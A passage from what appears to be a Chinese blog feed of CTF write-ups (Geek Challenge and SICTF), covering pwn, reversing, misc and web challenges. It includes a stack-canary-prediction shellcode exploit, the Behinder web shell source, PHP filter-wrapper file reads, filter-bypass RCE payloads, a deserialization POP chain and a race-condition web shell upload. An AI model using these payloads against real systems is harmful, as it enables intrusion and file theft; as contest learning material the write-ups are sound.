class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>ret_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x401257</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    seed <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">60</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    v1 <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>srand<span class=\"token punctuation\">(</span>seed<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    v2 <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    v3 <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    canary_pre <span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>v2 <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> v3 <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>v3 <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>v2 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>v2 <span class=\"token operator\">>></span> <span class=\"token number\">48</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>v2 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>v3 <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>v3 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">48</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    canary <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>canary_pre<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">:</span><span class=\"token number\">30</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token comment\"># r = process('./chal')</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.node.game.sycsec.com'</span><span class=\"token punctuation\">,</span><span class=\"token number\">31883</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    payload <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    payload <span class=\"token operator\">+=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token string\">'rax'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4040E0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    payload <span class=\"token operator\">+=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4040E0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    se<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4040E0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    sea<span class=\"token punctuation\">(</span><span class=\"token string\">b'tell me something:\\n'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    res <span class=\"token operator\">=</span> r<span class=\"token punctuation\">.</span>recvall<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">b'stack'</span> <span class=\"token keyword\">in</span> res<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr></table></figure><h2 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> re</h2>\n<h3 id=\"shiftjmp\"><a class=\"markdownIt-Anchor\" href=\"#shiftjmp\">#</a> shiftjmp</h3>\n<p>花指令</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"flag:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">33</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> rodata<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> i <span class=\"token operator\">^</span> <span class=\"token function\">getchar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"no\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"yes\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">// rodata = SXAxS6jd8doTxBQ&#123;x\"Ma',27h,'csE-|El,o/&#123;^\\</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    rodata <span class=\"token operator\">=</span> <span class=\"token string\">\"SXAxS6jd8doTxBQ&#123;x\\\"Ma',27h,'csE-|El,o/&#123;^\\\\\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    flag <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>rodata<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        flag <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>rodata<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> flag</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>get_flag<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"幸运数字\"><a class=\"markdownIt-Anchor\" href=\"#幸运数字\">#</a> 幸运数字</h3>\n<p>直接写个脚本，往程序循环加一输入数字，能得到 flag</p>\n<h3 id=\"砍树\"><a class=\"markdownIt-Anchor\" href=\"#砍树\">#</a> 砍树</h3>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/13.png\" alt=\"image-20231030090452684\"></p>\n<p>key:Syclove</p>\n<p>加密算法：</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/14.png\" alt=\"image-20231030090659388\"></p>\n<pre><code>002020171B360E362617042A2907261552332D0F3A271106330746173D0A3C382E2218\n</code></pre>\n<p>解题脚本：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">A0OWO0A</span><span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">,</span> a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">34</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        a1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> a2<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> <span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">return</span> a1</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>a1 <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">.</span>fromhex<span class=\"token punctuation\">(</span><span class=\"token string\">'002020171B360E362617042A2907261552332D0F3A271106330746173D0A3C382E2218'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>a2 <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span><span class=\"token string\">b'Syclove'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>result <span class=\"token operator\">=</span> A0OWO0A<span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">,</span> a2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "http://example.com/2023/09/10/sictf-wp/",
            "url": "http://example.com/2023/09/10/sictf-wp/",
            "title": "sictf_wp",
            "date_published": "2023-09-10T11:48:34.000Z",
            "content_html": "<h1 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> MISC</h1>\n<h3 id=\"签到welcome\"><a class=\"markdownIt-Anchor\" href=\"#签到welcome\">#</a> 签到] Welcome</h3>\n<p><img data-src=\"/img/sictfpic/1.png\" alt=\"img\"></p>\n<h3 id=\"pixel_art\"><a class=\"markdownIt-Anchor\" href=\"#pixel_art\">#</a> Pixel_art</h3>\n<pre><code class=\"language-PHP\">from PIL import Image\nimage = Image.open('image.png')\nwidth, height = image.size\nfor y in range(height):\n    for x in range(width):\n        r, g, b = image.getpixel((x, y))\n        if r == 46:\n            print('.',end=&quot;&quot;)\n        elif r == 33:\n            print('!',end=&quot;&quot;)\n        elif r == 63:\n            print('?',end=&quot;&quot;)\n        if g == 46:\n                print('.',end=&quot;&quot;)\n        elif g == 33:\n                print('!',end=&quot;&quot;)\n        elif g == 63:\n                print('?',end=&quot;&quot;)\n        if b == 46:\n            print('.',end=&quot;&quot;)\n        elif b == 33:\n            print('!',end=&quot;&quot;)\n        elif b == 63:\n            print('?',end=&quot;&quot;)\n</code></pre>\n<pre><code class=\"language-aspn\n Ook\n</code></pre>\n<h3 id=\"baby_zip\"><a class=\"markdownIt-Anchor\" href=\"#baby_zip\">#</a> baby_zip</h3>\n<pre><code class=\"language-PHP\">bkcrack -C flag.zip -c flag.png -x 0 89504E470D0A1A0A0000000D49484452\nbkcrack -C flag.zip -c flag.png -k 6424c164 7c334afd f99666e5 -d flag.png\n</code></pre>\n<p>010 查看 flag 在最后</p>\n<h3 id=\"easy_shark\"><a class=\"markdownIt-Anchor\" href=\"#easy_shark\">#</a> Easy_Shark</h3>\n<p>AES 冰蝎 3 流量的特征</p>\n<pre><code class=\"language-PHP\">&lt;?php\n@error_reporting(0);\nsession_start();\n    $key=&quot;2295d22e2d70888f&quot;;\n        $_SESSION['k']=$key;\n        $post=file_get_contents(&quot;php://input&quot;);\n        if(!extension_loaded('openssl'))\n        &#123;\n                $t=&quot;base64_&quot;.&quot;decode&quot;;\n                $post=$t($post.&quot;&quot;);\n                \n                for($i=0;$i&lt;strlen($post);$i++) &#123;\n                             $post[$i] = $post[$i]^$key[$i+1&amp;15]; \n                            &#125;\n        &#125;\n        else\n        &#123;\n                $post=openssl_decrypt($post, &quot;AES128&quot;, $key);\n        &#125;\n    $arr=explode('|',$post);\n    $func=$arr[0];\n    $params=$arr[1];\n        class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;\n    @call_user_func(new C(),$params);\n?&gt;\nkey = '2295d22e2d70888f'\n</code></pre>\n<p><img data-src=\"/img/sictfpic/2.png\" alt=\"img\"></p>\n<p>解冰蝎流量</p>\n<p><img data-src=\"/img/sictfpic/3.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/sictfpic/4.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/sictfpic/5.png\" alt=\"img\"></p>\n<p>Gron 解密</p>\n<pre><code class=\"language-PHP\">def decrypt_string(ciphertext, offsets):\n    decrypted_string = &quot;&quot;\n    offset_index = 0\n\n    for char in ciphertext:\n        offset = offsets[offset_index] % 26\n        decrypted_char_code = (ord(char) - ord('A') - offset) % 26 + ord('A')\n        decrypted_char = chr(decrypted_char_code)\n        decrypted_string += decrypted_char\n\n        offset_index = (offset_index + 1) % len(offsets)\n\n    return decrypted_string\n\nciphertext = &quot;TGLBOMSJNSRAJAZDEZXGHSJNZWHG&quot;\noffsets = [1, 50, 61, 8, 9, 20, 63, 41]\n\nwhile True:\n    decrypted_string = decrypt_string(ciphertext, offsets)\n    print(decrypted_string)\n</code></pre>\n<h3 id=\"fast_morse\"><a class=\"markdownIt-Anchor\" href=\"#fast_morse\">#</a> fast_morse</h3>\n<p>morse 解密</p>\n<p><img data-src=\"/img/sictfpic/6.png\" alt=\"img\"></p>\n<p>得到 falg</p>\n<p><img data-src=\"/img/sictfpic/7.png\" alt=\"img\"></p>\n<p>变成小写</p>\n<p>flag:SICTF f2a098f-7f4a-93a5-c8a48360b03c}</p>\n<h3 id=\"qr_qr_qr\"><a class=\"markdownIt-Anchor\" href=\"#qr_qr_qr\">#</a> QR_QR_QR</h3>\n<pre><code class=\"language-Python\">import numpy as np\nimport matplotlib.pyplot as plt\nfrom pyzbar.pyzbar import decode\nfrom PIL import Image\nfrom pwn import *\n\n# 设置日志级别为调试模式\ncontext(log_level='debug')\n\n# 创建图片函数\ndef create_image(file_path):\n    with open(file_path, 'r') as file:\n        lines = file.readlines()\n\n    # 生成图片数组\n    image_array = [[255 if bit == '1' else 0 for bit in line.strip()] for line in lines]\n    image_array = np.array(image_array, dtype=np.uint8)\n\n    # 保存为图片\n    plt.imsave('output.png', image_array, cmap='gray')\n\n# 读取二维码函数\ndef read_qr_code(image_path):\n    image = Image.open(image_path)\n    decoded_objects = decode(image)\n    for obj in decoded_objects:\n        return obj.data.decode('utf-8')\n\n# 连接服务器\nconn = remote('210.44.151.51', 10523)\n\nwhile True:\n    try:\n        # 从服务器接收数据\n        data = conn.recvuntil('Please Decrypt this QR code:', drop=True)\n\n        # 将数据保存到文本文件\n        with open('1.txt', 'w') as file:\n            file.write(data.decode())\n\n        # 从文本文件创建图片\n        create_image('1.txt')\n\n        # 读取图片中的二维码\n        code = read_qr_code('output.png')\n        print(code)\n\n        # 发送二维码到服务器\n        conn.sendline(str(code))\n        conn.recvline()\n    finally:\n        # 关闭文件\n        file.close()\n</code></pre>\n<h3 id=\"问卷调查\"><a class=\"markdownIt-Anchor\" href=\"#问卷调查\">#</a> 问卷调查</h3>\n<p>第三道就是 flag</p>\n<p>SICTF SICTF_Round3_will_do_even_better!}</p>\n<h1 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> WEB</h1>\n<h3 id=\"签到include\"><a class=\"markdownIt-Anchor\" href=\"#签到include\">#</a> [签到] Include</h3>\n<p>利用伪协议可直接读到 flag</p>\n<pre><code class=\"language-Python\">    /?SICTF=php://filter/convert.base64-encode/resource=/flag\n</code></pre>\n<h3 id=\"baby_php\"><a class=\"markdownIt-Anchor\" href=\"#baby_php\">#</a> Baby_PHP</h3>\n<pre><code class=\"language-PHP\">&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n\n$query = $_SERVER['QUERY_STRING'];\n\nif (preg_match('/_|%5f|\\.|%2E/i', $query)) &#123;\n    die('You are Hacker!');\n&#125;\nif($_GET['k_e_y'] !=='123' &amp;&amp; preg_match('/^123$/',$_GET['k_e_y']))&#123;\n    echo(&quot;You are will Win!&lt;br&gt;&quot;);\n    if(isset($_POST['command']))&#123;\n        $command = $_POST['command'];\n        if(!preg_match(&quot;/\\~|\\`|\\@|\\#|\\\\$|\\%|\\&amp;|\\*|\\（|\\）|\\-|\\+|\\=|\\&#123;|\\&#125;|\\[|\\]|\\:|\\'|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i&quot;,$command))&#123;\n            eval($command);\n        &#125;\n        else&#123;\n            echo(&quot;You are Hacker!&quot;);\n        &#125;\n    &#125;\n&#125;\nelse&#123;\n    echo(&quot;K_e_y is Errors!&quot;);\n&#125;K_e_y is Errors!\n</code></pre>\n<p>代码开始会对输入的字符串进行正则匹配，跟_有关的 url 编码之类的全部过滤</p>\n<p>可以用空格或者。代替_,. 又被过滤了，用了空格，后面一个简单的若比较换行符绕过</p>\n<p>后面 cmd 一个无数字字母 rce</p>\n<p>可见 ctfshow  web40 的题解</p>\n<pre><code class=\"language-Plain\">/?k%20e%20y=123%0a\ncommand=show_source(next(array_reverse(scandir(pos(localeconv())))));\n</code></pre>\n<h3 id=\"rce\"><a class=\"markdownIt-Anchor\" href=\"#rce\">#</a> RCE</h3>\n<pre><code class=\"language-Plain\">&lt;?php \nerror_reporting(0); \nhighlight_file(__FILE__); \n$code = $_POST['code']; \n$code = str_replace(&quot;(&quot;,&quot;hacker&quot;,$code); \n$code = str_replace(&quot;.&quot;,&quot;hacker&quot;,$code); \neval($code); \n?&gt;\n</code></pre>\n<p>借鉴宏爷文章</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzYzOTI4Nzk2L2FydGljbGUvZGV0YWlscy8xMjc5NjMwNzk=\">https://blog.csdn.net/qq_63928796/article/details/127963079</span></p>\n<pre><code class=\"language-PHP\">code=echo $_POST[1];&amp;1=cat /f*\n</code></pre>\n<h3 id=\"我全都要\"><a class=\"markdownIt-Anchor\" href=\"#我全都要\">#</a> 我全都要</h3>\n<p>POP</p>\n<pre><code class=\"language-PHP\">&lt;?php\nhighlight_file(__FILE__);\n\nclass B&#123;\n    public $pop = '233333333';\n    public $i = '1';\n    public $nogame;\n\n    public function __destruct()\n    &#123;\n        if(preg_match(&quot;/233333333/&quot;,$this-&gt;pop))&#123;\n            echo &quot;这是一道签到题，不能让新生一直做不出来遭受打击&quot;;\n        &#125;\n    &#125;\n\n    public function game()&#123;\n        echo &quot;扣1送地狱火&quot;;\n        if ($this-&gt;i = &quot;1&quot;)&#123;\n            echo '&lt;img src=\\'R.jpg\\'&gt;';\n            $this-&gt;nogame-&gt;love();\n        &#125;\n    &#125;\n\n    public function __clone()&#123;\n        echo &quot;必须执行&quot;;\n        eval($_POST[&quot;cmd&quot;]);\n    &#125;\n&#125;\n\n\nclass A&#123;\n    public $Aec;\n    public $girl = 'QNKCDZO' ;\n    public $boy = '240610708';\n\n    public function __toString()\n    &#123;\n        echo &quot;I also want to fall in love&quot;;\n        if($this-&gt;girl != $this-&gt;boy &amp;&amp; md5($this-&gt;girl) == md5($this-&gt;boy))&#123;\n            $this-&gt;Aec-&gt;game();\n        &#125;\n    &#125;\n\n\n&#125;\n\n\nclass P&#123;\n    public $MyLover;\n    public $name = '1';\n    public function __call($name, $arguments)\n    &#123;\n        echo &quot;有对象我会在这打CTF???看我克隆一个对象！&quot;;\n        if ($name != &quot;game&quot;) &#123;\n            echo &quot;打游戏去，别想着对象了&quot;;\n            $this-&gt;MyLover = clone new B;\n        &#125;\n    &#125;\n\n\n&#125;\n$a = new B();\n$a -&gt;pop = new A();\n$a -&gt;pop -&gt;Aec = new B();\n$a -&gt;pop -&gt;Aec -&gt; nogame = new P();\necho serialize($a);\n</code></pre>\n<p>然后命令执行</p>\n<p>cmd=</p>\n<h3 id=\"你能跟得上我的speed吗\"><a class=\"markdownIt-Anchor\" href=\"#你能跟得上我的speed吗\">#</a> 你能跟得上我的 speed 吗</h3>\n<p>条件竞争</p>\n<p>准备一个 php 文件</p>\n<p>内容为</p>\n<pre><code>&lt;?php @eval(system(&quot;cat /flag&quot;));?&gt;\n</code></pre>\n<p>抓两个包</p>\n<p>一个为 get 传参的包，访问 url/uploads/2.php, 抓包</p>\n<p>另一个为 post 包，直接就抓上传的包，如下</p>\n<p><img data-src=\"/img/sictfpic/8.png\" alt=\"img\"></p>\n<p>俩个包用 burp 爆破，爆破方式为 noplayload，开跑</p>\n<p><img data-src=\"/img/sictfpic/9.png\" alt=\"img\"></p>\n<h1 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> Re</h1>\n<h3 id=\"签到pyc\"><a class=\"markdownIt-Anchor\" href=\"#签到pyc\">#</a> [签到] PYC</h3>\n<p><img data-src=\"/img/sictfpic/10.png\" alt=\"img\"></p>\n<h3 id=\"myobject\"><a class=\"markdownIt-Anchor\" href=\"#myobject\">#</a> Myobject</h3>\n<p>动调出数据，直接赛博厨子秒了</p>\n<p><img data-src=\"/img/sictfpic/11.png\" alt=\"img\"></p>\n<h3 id=\"chbase\"><a class=\"markdownIt-Anchor\" href=\"#chbase\">#</a> chbase</h3>\n<p>换表加密</p>\n<p><img data-src=\"/img/sictfpic/12.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/sictfpic/13.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/sictfpic/14.png\" alt=\"img\"></p>\n<h3 id=\"不一样的base64\"><a class=\"markdownIt-Anchor\" href=\"#不一样的base64\">#</a> 不一样的 base64</h3>\n<pre><code class=\"language-Java\">BASE64_CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\n\ndef base64_decode(encoded_data):\n    decoded_data = ''\n    padding_count = encoded_data.count('=')\n    encoded_data = encoded_data.replace('=', '')\n\n    binary_str = ''\n    for char in encoded_data:\n        decimal_val = BASE64_CHARS.index(char)\n        binary_str += format(decimal_val, '06b')\n\n    if padding_count &gt; 0:\n        binary_str = binary_str[:-padding_count * 2]\n\n    for i in range(0, len(binary_str), 8):\n        byte = binary_str[i:i + 8]\n        decoded_data += chr(int(byte, 2))\n\n    return decoded_data\n\nencoded_data = input('')\ndecoded_data = base64_decode(encoded_data)\nprint(decoded_data)\n</code></pre>\n<h1 id=\"pwn\"><a class=\"markdownIt-Anchor\" 